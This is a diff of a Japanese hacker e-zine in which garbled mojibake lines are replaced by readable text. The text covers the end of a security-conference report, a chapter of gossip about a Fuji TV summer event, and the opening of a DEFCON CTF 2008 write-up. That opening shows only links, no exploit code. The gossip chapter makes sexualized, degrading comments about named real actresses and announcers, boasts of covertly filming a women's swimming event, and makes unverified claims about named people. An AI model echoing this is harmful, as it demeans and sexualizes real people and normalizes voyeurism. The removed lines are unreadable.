-���p���׋����悤�Ǝv���܂��B
+　他のスピーカの発表や聴衆の反応を見ていると、文化の違いからなのか、韓国
+では理論や研究的な内容よりも、実戦的な実演結果のほうが好まれるように思い
+ました。その点では、私自身の発表では理屈の説明だけでなく所々に簡単なデモ
+を含めていたのが功を奏したのかも知れません。
 
 
+■0x06). 終りに
 
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+　10月のBlack Hat Japan、11月のPOC2008と大きなイベントに立て続けに参加し
+て思ったのですが、やはり大切なのは英語だということを改めて痛感しました。
+　イベントを通じて多くの人と会い、たくさんのコミュニケーションができるせ
+っかくの機会なのに、英語がわからないと全く何もできません。2009年はもう少
+し英語を勉強しようと思います。
 
---- ��3��: TV�ǋ��z�� ---
 
-���ҁF������
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
+--- 第3章: TV局狂想曲 ---
 
-��0x01.) �͂��߂�
+著者：理事長
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
 
 Guten Tag !
 Wie geht es Ihnen ?
 
-�@�������g�ɂ��݂ē����������ɂȂ�����A���������߂����ł��傤���H
-���^�N�V�̓A�p�[�g�̌���Ɋ`�̃^�l��A���Ă݂܂������A���̕ω����N�����
-����B
+　寒さが身にしみて凍死しそうになる昨今、いかがお過ごしでしょうか？
+ワタクシはアパートの軒先に柿のタネを植えてみましたが、何の変化も起こりま
+せん。
 
-�@��͂�s�[�i�b�c���Ȃ��Ƃ��߂Ȃ̂ł��傤���H����Ƃ����{�I�ɁA��������
-����Ă���̂ł��傤���H
+　やはりピーナッツがないとだめなのでしょうか？それとも根本的に、何かが間
+違っているのでしょうか？
 
-�y�Ғ��z���̕����͒��ҁF�@���@�l���A���y�сA�ҏW�F�@���@�l���A����������
-�Ȃ��Ă��܂��B
-
-
-��0x02.) ���N�O��TV�ǂ̃A���Q�Ȏ���
-
-�@���āA�F������P��Q�A�e���r�֌W�̉\�����ɂ������Ƃ��L��Ǝv���܂��B
-�@�u���[���B�͂񂭁��ɂ��ꂽ�v�Ƃ�����ȗނ̉\�b�B�܂��A�|�\�֌W�͂�
-�܂肨�b���ł��܂��񂪁A?����Ƀe���r�Ǔ��̗�����ł����b�����悤�Ǝv��
-�܂��B�������Ј��ł��Ȃ��̂ŁA�\�͉\�B������A�����̌��������Ƃ����̂܂�
-�F�l�ɂ��`�����悤�Ǝv���܂��B?
-
-�@���āA�e���r�ǂ̗��b���n�߂�O�ɁA?�Ȃ����^�V������ȗ������m���Ă���
-�̂��Ƃ����ƁA�ȒP�ł��B�e���r�ǂœ����Ă��܂����B?���m�ɂ̓t�W�e���r�֘A
-�ł��d���������Ē����܂����B�����m�̕�������������Ǝv���܂����A���N�O
-�̉āA?�t�W�e���r�Łu�����`�����v�Ƃ����C�x���g������܂����B���A�����
-�ւ���Ă��܂������A?�����ł͂��Ȃ�d�v�ȃX�^�b�t�ł������ƔF�����Ă����
-���B
-�@����ɂԂ����Ⴏ�Ă��܂��ƁA?�u�����`�����E�H�[�^�[�{�[�C�Y�v�̊֘A��
-�ł�����܂��B�܂��A?����Ȃ���ȂŃt�W�e���r�Ƃ̊ւ��������Ƃ��ł���
-�킯�ł���܂��B���āA�u�����`�����v�ň�Ԃ̖ڋʏ��i�A?����͂�͂莄��
-�ւ�����u�E�H�[�^�[�{�[�C�Y�v�ł��傤�B����͂��́u�E�H�[�^�[�{�[�C�Y�v
-���u���ł���܂ł����J�������Ǝv���܂��B�t�W�e���r�̓K��������������ɂ�
-�邱�ƕK���ł��B
-
-�@�u�ꏏ�Ɏd�����Ȃ��H�v??�F�B���炱��Ȏ��������܂����B�����o�C�g����
-�̂l����ł��B?���̕��A���X�ς�����E���̎�����ŁA���Z����ɉ��y�Ń��W��
-�[�f�r���[�����A?�����̕���ē����Ȃ��A�N���ɂȂ�ƍg���̍���̃o�b�N��
-���t?�i���͉��t���Ă��Ȃ��B�g���̓J���I�P�������炵���j���Ȃ���A?���j��
-�C���X�g���N�^�[�̃A���o�C�g�����Ă���Ƃ����R�O��㔼�̒j���ł��B
-�@�b�𕷂��ƁA�u�t�W�e���r���C�x���g�i�`�����j�̂��߂ɁA�E���疜�����ĉ�
-�O�v�[������邩��A�����Ŗʔ������Ƃ��Ă���Ȃ��H�����P�T�O�O���~������
-���炳�v�Ƃ̂��ƁB
-
-�@�ǂ���炱�̎��_�Œj�̃V���N���A�u�E�H�[�^�[�{�[�C�Y�v�����邱�Ƃ�����
-���Ă����炵���ł��B�l���񂪁u�M�����������邩�炳�`�v���̏u�ԂɎ��͖���
-��u�����`�����E�H�[�^�[�{�[�C�Y�A�V�X�^���g�}�l�[�W���[�v�Ƃ�����E��
-�A���܂����B�V���N���͐l�Ԃ����܂��B
-�@�������A�V���N�������Ă����l�Ԃ����܂���B�����Ńt�W�e���r�ɂ��肢��
-�āA�e���r�ŕ�W�������Ă���Ȃ����Ƃ��肢���Ă݂��Ƃ���A�u�����`�߂���
-���e���r�ŕ�W�������`�v�Ƃ̂��ƁB�c�c�c�c�ق�̂Q�`�R�b�ŁA�X�[�p�[�i
-�����j���o�������ł����B�m���ɁA�߂��܂��e���r�ŕ�W���Ă���܂�����I��
-���ˁA���̕�W�̎d���͋S���Ǝv���܂�����B
-�@������A���傤���Ȃ������V���N�����Ă����l��T���܂����B�E�H�[�^�[�{
-�[�C�Y�͑S���Ŋm���Q�O�l�B?���̓��̂T�l�����̐g������V���N�������܂�����B
-�S�S�������{��Q�T�ԍ��h�i��ʔ��j�{�ʂ����K�i��ʔ��j����Q����
-���Ŗ�Q�O���~�Ƃ��������f�f�������ȃM�����Łc�B���̃M������񎦂������A
-���ʂ̐l�Ȃ���܂���B?�Q���������ʂɃA���o�C�g����΂���ȏ�҂��邵�A
-�Ȃɂ���w�������܂��B
-
-�@�`�����I����ł����A��w���͌����ݑO���̒P�ʂ𗎂Ƃ��Ă��܂��B�܂�A
-���̈����l���t�W�e���r�Ɗւ����������̂ł��B���Ă��āA�E�H�[�^�[�{�[�C
-�Y�̉��Z�������ɋ߂Â��A�{�����܂Ő����ɔ��������A���肪�����B�u�v�[��
-�������Ă܂���v���ɂ��点�t�W�e���r�I�{�����܂ł��ƂQ�`�R�������Ȃ��̂�
-���䂪�������Ă̂͂ǂ������������H?�m���P�T�ԑO�ɂ͊��������܂��Ƃ�������
-�Ȃ��������H�R���H�R�����H?
-�@���̂����Ŏ����ǂꂾ���e���p�����������m�H??���E���E���@�v�[���i�ϋq��
-���܂߂��̈�сj���A�܂������\�芮���}�ƈقȂ�̂͂ǂ��������ł����H�@��
-�[�͊m���P�D�Q�����炢�ł��肢���܂�����ˁH�@���ꂭ�炢����Ȃ��ƃW����
-�v�Ƃ��̉��Z���ł��Ȃ���ł���B�@���ł����P�D�S�����āH���̂��������Q�O
-�����̂������ŁA?�����ɂ������Ă͐��[�𒲐��������������ł���B
-�@���ƁA�v�[���̖��Ƃ����鉖�f�B��������������ł��Ȃ��A���傭���傭����
-���Ɛ�����ςȂ��ƂɂȂ�܂����B�]�v�Ȏd���𑝂₳�Ȃ��ł��������B���ɂ��A
-���̂܂����������\��}�ƈقȂ����v�[���͑���̗��B�ϋq�Ȃ���v�[���܂�
-�̋������S�R�Ⴄ���A�������Ⴄ�B�������͗����Ŏd������̂Ɂi�����ɂȂ邩
-��j�A������������Ƃ��������i���̂�������͂��܂����j�B���i�͑S���͂�
-���A�\��������S�R�Ⴄ�����ɉ^�΂�邵�B�t�W�e���r�A�������肵�Ă��������I
-
-�@��肾�炯�ŕ������f�o�i�Q�l�v���B�ȒP�Ɍ����Βʂ��m�Áj�����B�t�W�̂�
-�̂��l�������Ă܂����B�c�c���̂Ƃ��̃t�W�̂��̂��l���A?����܂苻���Ȃ���
-���Ɍ������͎̂������ł��傤���H�@�������薳�����t�������ė��������Ă�
-���܂����B�܂�A���̎��ɂ͉�X�u�����`�����E�H�[�^�[�{�[�C�Y�v�́A��
-���������҂���Ă��Ȃ������킯�ł��B���̓��e�́A���E���Ŏ��Ƃl���񂵂��m
-��Ȃ����ɔ���e�ł��̂ŁA�����t�W����N���[��������A�����Ȃ荢��܂��B
-[���̂Ƃ��́A�@���@�l���A���������s�ψ���ӔC�����܂���B�������L���B]
-�@�Ƃ肠�����v���o��U��Ԃ��Ă݂܂��傤?�E�C�x���g���s�����S�S���Ԃ�3,4
-88,434�l�̗���?�EMEGUMI��T�V���c�͂��؂ꂻ���������B�Ј��H���ŕ��ʂɂ���
-�H�ׂĂ��B
-
-�E���r�h�q�̂����ς��L���m���C�B���A�����ꂭ��Ȃ��قǗ₽���l�B
-�E�Ί_�C���E�Έ�q��E�{�n�^���E���ŗR�F�i�h���}�E�H�[�^�[�{�[�C�Y�o���j
-�̓X�^�b�t�ɗD���������B
-�E���q�A�i�����ʁi��ɂ߂��܂��e���r�j�A�����������ǂ���܂苹�����悤
-�Ɏv�����B
-�E���q�A�i���u���i���F2-X�j�A�������Ȃ��������Ȃ��������z�������A��
-���Ȃ��A�i�C�i�C�s�����̏��q�A�i�B
-�E�����炯�̐��j���𓐎B���Ă�����΂�ē{��ꂽ�B
-�E���΂��J���j���O�̌|�̖����B
-�E�t�W�e���r�̋������̍r���B
-
-�@�c�c�낭�����ۑf�G�Ȏv���łȂ��ł��ˁB�S�Ă����ς��Ɏx�z����Ă��܂��B
-MEGUMI�̓m�[���C�N�ŕ��ʂɔѐH���Ă܂����B�e���r��萶�Ō������������
-���B��͂�MEGUMI�������ς��ł��B�����ɋ��Ɏ����������܂����B��������
-�u���IMEGUMI���I�v�Ǝv�������炢�ł�����B?��b�������܂���ł������A�e��
-�r�Ō�����_�炩����ۂ��󂯂��̂ŁA?�C���[�W�͕ς��܂����B?
-�@���r�h�q�A�����͖{���Ƀ_���_���ł��B�����Ȃ������牿�l�����ł��B�C�x
-���g�ňꏏ�̎d���������̂ł����A���A���낭�ɂł��Ȃ��l�ł��B�������A����
-�ς������͒��ꗬ���Ǝv���܂����B
-�@�h���}�E�H�[�^�[�{�[�C�Y�o���̏�L�S���́A�{���ɗǂ��������ł����B�X�^
-�b�t�ɗD�����A�����ƃX�^�b�t��l�Ԉ������Ă���܂����B�X�^�b�t�݂�Ȃ�
-�W���ʐ^�܂�OK���Ă��ꂽ���̗D�����I���r�h�q�I���̐l���������K���I�I���A
-���̂S���ƌʂɎʐ^���B�点�Ē����܂����B���̎��A�{�n�^���̃V���c�̉���
-�炨���ς������Ⴂ�܂������A�n���������̂ŃQ���i���ł��B
-
-�@�߂��܂��e���r�A�i�E���T�[�����ʁB�Ƃ��Ă������Y��ȏ����ł����B��x
-�ŗǂ����炨���肵�Ă��炢�����ƁA�{�C�Ŋ�������炢�ł��B�������A�c�O��
-���炠��܂蓪�̐؂�͗ǂ��Ȃ������Ȋ������󂯂܂����B�V�R�ۂ�����A����
-�؂̕��ɂ�OK���Ǝv���܂��B
-�@���q�A�i���I�I�����͏��r�h�q�ɑ����ԓx�������ł��B���r�h�q���l�A��
-���Ɏd���������ł����A���A�����Ƒł����킹�܂ł��܂����B�ł����킹��
-�Ȃ̂ɂ낭�����ۘb�͕����Ȃ����A���ς͔Z���A�����Ȃ��I?�������i�C�i�C�s
-�����ł��B
-
-�@�����炯�̐��j���A���ꂪ��Ԏv���o�[�������ł��B�Ƃ肠�����̂��̓G
-�������A�����������ł��B�������OK�I�݂����Ȕn�����������܂���ł����B
-�ł��A�����̏�Ɂu�~�j���߁v�Ƃ����X�e�b�L�[�Ȉߑ���g�ɓZ���Ă����̂ŁA
-OK�ł��B
-�@���ƁA��{�ɂ͂��񑩂́u�|�����v������܂����B�F����A���́u�|�����v��
-�点�����Ēm���Ă��܂����H���͒m��܂���ł����B�����đ�{�Ɂu�����Ń|��
-���v�݂����Ȃ��Ƃ������Ă��邵�c�c�B�������A�u�|�������鏗����AV���D�v��
-���Ă�������c�c�E�K�E(�m�D`)�E�K�E?
-
-�@���΂��|�l�J���j���O�B?���ł����e���r�ł��܁`�Ɍ��܂����A������{����
-�������낭�Ȃ��ł��B�����^���_�o���[���I���A�J���j���O�ׂ̍����ɉ��Z�w
-�������̂ł����A?�S���o�����Ȃ��Ƃ����v�̖̂����I���r�h�q�ƃJ���j���O��
-��l���R�����g�̃L���b�`�{�[�������Ă����̂ł���?�i�����d���ł����j�A�L��
-�b�`�{�[���ɂȂ�܂���B���̎��̏��r�h�q�̉���������悤�Ȗڂ͖Y��܂���B
-
-�@���āA����̘b�̔��[�ƂȂ����t�W�e���r�B�t�W�e���r�i�ǂ��̋ǂ���������
-����܂��񂪁j�͋����������[����Ȃ��Ǝv����?�����B�Ƃ������A�����ۓ�
-���������ł��B�C�x���g���ɉ�����邩�炻���Ō|����I����ȂƂ���ł��B
-
-�@�܂��܂��L��܂��B���́u�E�H�[�^�[�{�[�C�Y�v���������l�C���o�Ă��܂��A
-�t�W�e���r�̂��̃C�x���g���x�z���n�߂����A���̂��l�������āA�u�i�m���j�T
-�O�O���~�����邩������Ƒ�R����āv���݂ɂS�S���Ԃ̓��AOFF�̓g�[�^���łP
-�T�Ԃ��Ȃ��A������̂𒣂��Ă��܂��B�ܘ_�s�[�N�Ȃ�ĂƂ��̐̂ɒ����A�Ă�
-�̂ɔM���o��X�^�b�t�A�ӎ��N�O�Łu�|�v�����č���܂�X�^�b�t�ȂǁA�ߍ���
-���A���ŉ��Ƃ����悤�Ƃ��Ă��܂����B�󂯎���ăX�^�b�t�ɂ͊撣���Ă��炢
-�܂������ǂˁB���݂ɂ��́u�|�v�����Ă���X�^�b�t�͂��́i�m���j�T�O�O���~
-�̑��݂�m��܂���B��X�d�v�ȃX�^�b�t�����̃M�����Ƃ��ď����܂����B����
-�ȊO�ɁA���ł��l�𑀂�܂��B
-�@�S�S���ԂŃt�W�֌W�������������E�����Ă���������i�o���Ă���͈͂Łj
-�́A�r�[���i��R�j�A�h�{�h�����N�i��R�j�A���i�����ȕ��j�A?�Ă����i��l
-�Q�����炢�Ńg�[�^���T�O���~�قǁj�A�ł��グ�̃z�e���݂��؂�i�ꕔ�j���X�A
-���肾������ł��B
-�@��ԋh���������Ƃ́A�C�x���g�I����̑ł��グ�ł��B�t�W�e���r�ׂ̗ɂ���
-�p�V�t�B�b�N�����f�B�A���̈ꕔ��݂��؂��čs���܂����B���݂Ƀt�W�̎Ј�
-�͂��̃z�e���P���P���~�Ŕ��܂��炵���ł��B���蓾�Ȃ��ł��B
-
-�@���āA���̑ł��グ�Ńt�W�̂��̂��l�������āA����ɍs���܂������A����
-���ȒP�ꂪ��ь����܂��B
-
-�u�����i�̂��l�̖��O�j����A�����o���ďo���āv
-�u�����i�����ƈ̂��l�̖��O�j����A���Ȃ����o���āv
-�u�����i����Ɉ̂��l�̖��O�j����A���z�o���ďo���āv
-�u�����i�����܂ŗ���Ə햱�Ƃ������Ƃ��̃��x���̐l�j����A�L����S���o���āv
-
-�@�W�܂������z�͖�Q�O���~�B�u�Q�O���~���D����񂯂���I�v
-�@�c�c���E���Ⴂ�܂��ˁB
-
-�@�Ō�Ɍo��g�����݂̎��Ԃ������ɖ��炩�ɂ��܂��B�C�x���g�g�[�^���S�S��
-�ԂŁA�t�W�e���r�̌o��v�Ƃ������t�ɊÂ������ʁA�����ʂɊm���T��A������
-�C�P��A�����P��AZEST�@CANTINA�P�O��ȏ�ACafe�@La�@Boheme�P�O��ȏ�A
-�p�V�t�B�b�N�����f�B�A���Q�O���ȏ�B
-
-�@����܂�ǂ��v���o�͂���܂���ˁB
-�@�t�W�e���r�ɗǂ���ۂ����ĂȂ��̂�����ł��B?
+【編注】この文書は著者：宗凶法人愛連合准尉、編集：宗凶法人愛連合理事長と
+なっています。
 
 
-��0x03.) �Ō��
+■0x02.) 数年前のTV局のアレゲな事情
 
-?�@����ł��A�܂������悤�Ȋ�������悤�ł��B���A�L��]���Ă��܂��˂�?
+　さて、皆さんも１つや２つ、テレビ関係の噂を耳にしたことが有ると思います。
+　「モー娘。はつんく♂にやられた」とかそんな類の噂話。まぁ、芸能関係はあ
+まりお話しできませんが、?代わりにテレビ局内の裏事情でもお話ししようと思い
+ます。もちろん社員でもないので、噂は噂。だから、私が体験したことをそのまま
+皆様にお伝えしようと思います。?
+
+　さて、テレビ局の裏話を始める前に、?なぜワタシがそんな裏事情を知っている
+のかというと、簡単です。テレビ局で働いていました。?正確にはフジテレビ関連
+でお仕事をさせて頂きました。ご存知の方もいらっしゃると思いますが、数年前
+の夏、?フジテレビで「お台場冒険王」というイベントがありました。私、それに
+関わっていましたし、?自分ではかなり重要なスタッフであったと認識しておりま
+す。
+　さらにぶっちゃけてしまうと、?「お台場冒険王ウォーターボーイズ」の関連者
+でもあります。まぁ、?そんなこんなでフジテレビとの関わりを持つことができた
+わけであります。さて、「お台場冒険王」で一番の目玉商品、?それはやはり私も
+関わった「ウォーターボーイズ」でしょう。今回はその「ウォーターボーイズ」
+が講演できるまでを公開したいと思います。フジテレビの適当さが浮き彫りにな
+ること必死です。
+
+　「一緒に仕事しない？」??友達からこんな事を言われました。同じバイト仲間
+のＭさんです。?この方、中々変わった職歴の持ち主で、高校時代に音楽でメジャ
+ーデビューをし、?演劇の舞台監督もこなし、年末になると紅白歌合戦のバックで
+演奏?（実は演奏していない。紅白はカラオケが多いらしい）しながら、?水泳の
+インストラクターのアルバイトをしているという３０代後半の男性です。
+　話を聞くと、「フジテレビがイベント（冒険王）のために、ウン千万かけて屋
+外プールを作るから、そこで面白いことしてくれない？お金１５００万円あげる
+からさ」とのこと。
+
+　どうやらこの時点で男のシンクロ、「ウォーターボーイズ」をすることが決ま
+っていたらしいです。Ｍさんが「ギャラ奮発するからさ〜」この瞬間に私は名目
+上「お台場冒険王ウォーターボーイズアシスタントマネージャー」という役職に
+就きました。シンクロは人間がやります。
+　しかし、シンクロをしてくれる人間がいません。そこでフジテレビにお願いし
+て、テレビで募集をかけてくれないかとお願いしてみたところ、「了解〜めざま
+しテレビで募集かけるよ〜」とのこと。…………ほんの２〜３秒で、スーパー（
+字幕）が出ただけでした。確かに、めざましテレビで募集してくれましたよ！で
+もね、この募集の仕方は鬼だと思いましたよ。
+　だから、しょうがなく私がシンクロしてくれる人を探しました。ウォーターボ
+ーイズは全部で確か２０人。?その内の５人を私の身内からシンクロさせましたよ。
+４４日公演＋約２週間合宿（交通費自費）＋通い練習（交通費自費）＝約２ヶ月
+半で約２０万円という血反吐吐きそうなギャラで…。このギャラを提示させられ、
+普通の人ならやりません。?２ヶ月半普通にアルバイトすればそれ以上稼げるし、
+なにより大学生もいます。
+
+　冒険王終了後ですが、大学生は軒並み前期の単位を落としています。つまり、
+頭の悪い人がフジテレビと関わりをもったのです。さてさて、ウォーターボーイ
+ズの演技も完璧に近づき、本公演まで数日に迫った頃、大問題が発生。「プール
+完成してません」死にさらせフジテレビ！本公演まであと２〜３日しかないのに
+舞台が無いってのはどういうこった？?確か１週間前には完成させますとか言って
+なかったか？嘘か？嘘つきか？?
+　そのせいで私がどれだけテンパったかご存知？??し・か・も　プール（観客席
+も含めその一帯）が、まったく予定完成図と異なるのはどういう事ですか？　水
+深は確か１．２ｍくらいでお願いしましたよね？　それくらいじゃないとジャン
+プとかの演技ができないんですよ。　何ですか１．４ｍって？このたかだか２０
+ｃｍのおかげで、?私が暇を見つけては水深を調整したりもしたんですよ。
+　あと、プールの命といえる塩素。これも微調整ができなく、ちょくちょく見な
+いと水が大変なことになりました。余計な仕事を増やさないでください。他にも、
+このまったく完成予定図と異なったプールは大問題の嵐。観客席からプールまで
+の距離も全然違うし、高さも違う。こっちは裸足で仕事するのに（水着になるか
+ら）、砂利道を歩けとおっしゃる（すのこが後日届きました）。備品は全く届か
+ず、申請したら全然違う部署に運ばれるし。フジテレビ、しっかりしてください！
+
+　問題だらけで抱えたＧＰ（ゲネプロ。簡単に言えば通し稽古）当日。フジのお
+偉い様方も来てました。……このときのフジのお偉い様方、?あんまり興味なさそ
+うに見えたのは私だけでしょうか？　当たり障り無い言葉を言って立ち去ってい
+きました。つまり、この時には我々「お台場冒険王ウォーターボーイズ」は、ま
+ったく期待されていなかったわけです。この内容は、世界中で私とＭさんしか知
+らない超極秘内容ですので、もしフジからクレーム来たら、私かなり困ります。
+[そのときは、宗教法人愛連合中央執行委員会が責任持ちますよ。理事長記す。]
+　とりあえず思い出を振り返ってみましょう?・イベントを行った４４日間で3,4
+88,434人の来場?・MEGUMIのTシャツはち切れそうだった。社員食堂で普通にご飯
+食べてた。
+
+・小池栄子のおっぱいキャノン砲。挨拶もしれくれないほど冷たい人。
+・石垣佑磨・石井智也・宮地真緒・香椎由宇（ドラマウォーターボーイズ出演）
+はスタッフに優しかった。
+・女子アナ高島彩（主にめざましテレビ）、可愛かったけどあんまり胸無いよう
+に思えた。
+・女子アナ千野志麻（主にF2-X）、可愛くもないし胸もないし無愛想だし挨拶も
+しない、ナイナイ尽くしの女子アナ。
+・女だらけの水泳大会を盗撮していたらばれて怒られた。
+・お笑いカンニングの芸の無さ。
+・フジテレビの金遣いの荒さ。
+
+　……ろくすっぽ素敵な思いでないですね。全ておっぱいに支配されています。
+MEGUMIはノーメイクで普通に飯食ってました。テレビより生で見る方が可愛いで
+す。やはりMEGUMI＝おっぱいです。顔より先に胸に視線がいきました。胸を見て
+「あ！MEGUMIだ！」と思ったぐらいですから。?会話こそしませんでしたが、テレ
+ビで見るより柔らかい印象を受けたので、?イメージは変わりました。?
+　小池栄子、こいつは本当にダメダメです。胸がなかったら価値無しです。イベ
+ントで一緒の仕事だったのですが、挨拶もろくにできない人です。しかし、おっ
+ぱいだけは超一流だと思いました。
+　ドラマウォーターボーイズ出演の上記４名は、本当に良い方たちでした。スタ
+ッフに優しく、ちゃんとスタッフを人間扱いしてくれました。スタッフみんなで
+集合写真までOKしてくれたこの優しさ！小池栄子！この人たちを見習え！！私、
+この４名と個別に写真を撮らせて頂きました。その時、宮地真緒のシャツの横か
+らおっぱい見ちゃいましたが、貧乳だったのでゲンナリです。
+
+　めざましテレビアナウンサー高島彩。とっても可愛く綺麗な女性でした。一度
+で良いからお相手してもらいたいと、本気で願ったくらいです。しかし、残念な
+がらあんまり頭の切れは良くなさそうな感じを受けました。天然ぽいから、その
+筋の方にはOKだと思います。
+　女子アナ千野！！こいつは小池栄子に続く態度悪い女です。小池栄子同様、一
+緒に仕事をするんですが、私、こいつと打ち合わせまでしました。打ち合わせ中
+なのにろくすっぽ話は聞かないし、化粧は濃い、胸もない！?こいつもナイナイ尽
+くしです。
+
+　女だらけの水泳大会、これが一番思い出深かったです。とりあえず体つきはエ
+ロいが、頭が悪すぎです。可愛ければOK！みたいな馬鹿娘しかいませんでした。
+でも、水着の上に「ミニ浴衣」というステッキーな衣装を身に纏っていたので、
+OKです。
+　あと、台本にはお約束の「ポロリ」もありました。皆さん、この「ポロリ」や
+らせだって知っていました？私は知りませんでした。だって台本に「ここでポロ
+リ」みたいなことが書いてあるし……。しかも、「ポロリする女性はAV女優」だ
+っていうから……・゜・(ノД`)・゜・?
+
+　お笑い芸人カンニング。?今でこそテレビでたま〜に見ますが、こいつら本当に
+おもしろくないです。何より運動神経がゼロ！私、カンニングの細い方に演技指
+導したのですが、?全く覚えられないという要領の無さ！小池栄子とカンニングの
+二人がコメントのキャッチボールをしていたのですが?（同じ仕事でした）、キャ
+ッチボールになりません。あの時の小池栄子の汚物を見るような目は忘れません。
+
+　さて、今回の話の発端となったフジテレビ。フジテレビ（どこの局もそうかも
+しれませんが）は金遣いが半端じゃないと思いま?した。というより、企画を丸投
+げしすぎです。イベント会場に何か作るからそこで芸しろ！こんなところです。
+
+　まだまだ有ります。その「ウォーターボーイズ」が物凄く人気が出てしまい、
+フジテレビのこのイベントを支配し始めた頃、お偉い様方が来て、「（確か）５
+００万円あげるからもっと沢山やって」因みに４４日間の内、OFFはトータルで１
+週間もなく、一日中体を張っています。勿論ピークなんてとうの昔に超え、夏な
+のに熱が出るスタッフ、意識朦朧で「芸」をして骨を折るスタッフなど、過酷な
+中、金で何とかしようとしてきました。受け取ってスタッフには頑張ってもらい
+ましたけどね。因みにその「芸」をしているスタッフはこの（確か）５００万円
+の存在を知りません。我々重要なスタッフたちのギャラとして消えました。お金
+以外に、物でも人を操ります。
+　４４日間でフジ関係からもらった物・奢ってもらった物（覚えている範囲で）
+は、ビール（沢山）、栄養ドリンク（沢山）、服（高価な物）、?焼き肉（一人
+２万くらいでトータル５０万円ほど）、打ち上げのホテル貸し切り（一部）等々、
+盛りだくさんです。
+　一番吃驚したことは、イベント終了後の打ち上げです。フジテレビの隣にある
+パシフィックメリディアンの一部を貸し切って行われました。因みにフジの社員
+はこのホテル１泊１万円で泊まれるらしいです。あり得ないです。
+
+　さて、この打ち上げでフジのお偉い様方も来て、盛大に行われましたが、おか
+しな単語が飛び交います。
+
+「○○（偉い人の名前）さん、お金出して出して」
+「●●（もっと偉い人の名前）さん、あなたも出して」
+「□□（さらに偉い人の名前）さん、財布出して出して」
+「▲▲（ここまで来ると常務とか部長とかのレベルの人）さん、有り金全部出して」
+
+　集まった金額は約２０万円。「２０万円争奪じゃんけん大会！」
+　……世界が違いますね。
+
+　最後に経費使い込みの実態をここに明らかにします。イベントトータル４４日
+間で、フジテレビの経費」という言葉に甘えた結果、羅漢果に確か５回、すし京
+辰１回、権八１回、ZEST　CANTINA１０回以上、Cafe　La　Boheme１０回以上、
+パシフィックメリディアン２０泊以上。
+
+　あんまり良い思い出はありませんね。
+　フジテレビに良い印象を持てないのが現状です。?
 
 
+■0x03.) 最後に
 
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+?　それでも、また同じような企画をするようです。金、有り余っていますねｗ?
 
---- ��4��: �������A�h���X�����Ə������̈�ւ̍U���R�[�h�̒��� ---
 
-���ҁFKenji Aiko
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
+--- 第4章: メモリアドレス推測と小さい領域への攻略コードの注入 ---
 
-��0x01.) �͂��߂�
+著者：Kenji Aiko
 
-�@���E�K�͂ŊJ�Â����n�b�L���O�R���e�X�g�uDEFCON Capture the Flag�i�ȉ�
-CTF�j�v�ɂ́A�l�X�ȃZ�L�����e�B�z�[���𗘗p���ăp�X���[�h���擾����Remote
- Exploiting�n�̖�肪����܂��B����A���̒�����ЂƂ���I�сA���̉�
-���@���Љ�܂��B
-
-�@DEFCON Capture the Flag Web site
-�@http://nopsr.us/
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x02.) �ߋ����̓���
+■0x01.) はじめに
 
-�@CTF�ŏo�肳�ꂽ���́ACTF��Web�T�C�g�œ���ł��܂��B2008�N�̖��͈ȉ�
-�������\�ł��B2007�N�ȑO�̖���TOP�y�[�W���炽�ǂ邱�Ƃ��ł��܂��B��
-��������΁A�g���C���Ă݂Ă��������B
+　世界規模で開催されるハッキングコンテスト「DEFCON Capture the Flag（以下
+CTF）」には、様々なセキュリティホールを利用してパスワードを取得するRemote
+ Exploiting系の問題があります。今回、その中からひとつ問題を選び、その回答
+方法を紹介します。
 
-�@DEFCON CTF 2008 ���
-�@http://nopsr.us/ctf2008qual/
-
-�@Web�T�C�g������ƕ�����ʂ�A���̃R���e�X�g�ł͗l�X�ȕ���̖�肪�o�肳
-��܂��B����āA�����������߂ɂ͕��L���Z�L�����e�B�̒m�����K�v�ƂȂ�܂��B
-����́A���̒����珬���ȃq�[�v�̈�𗘗p����Remote Exploiting�n�̖����U
-�����܂��B�ł́ARealWorld 200�̖����_�E�����[�h���Ă��������B
-
-�@DEFCON CTF 2008 RealWorld 200
-�@http://nopsr.us/ctf2008qual/realworld200-be2241fd5ac13d18c2360046dba7ed0e
+　DEFCON Capture the Flag Web site
+　http://nopsr.us/
 
 
-��0x03.) IDAPro�ŋt�A�Z���u���R�[�h��ǂ�
+■0x02.) 過去問題の入手
 
-�@�܂��A�_�E�����[�h�����t�@�C�������̃^�C�v�̃t�@�C���ł��邩�𒲂ׂ܂��B
+　CTFで出題された問題は、CTFのWebサイトで入手できます。2008年の問題は以下
+から入手可能です。2007年以前の問題もTOPページからたどることができます。興
+味があれば、トライしてみてください。
+
+　DEFCON CTF 2008 問題
+　http://nopsr.us/ctf2008qual/
+
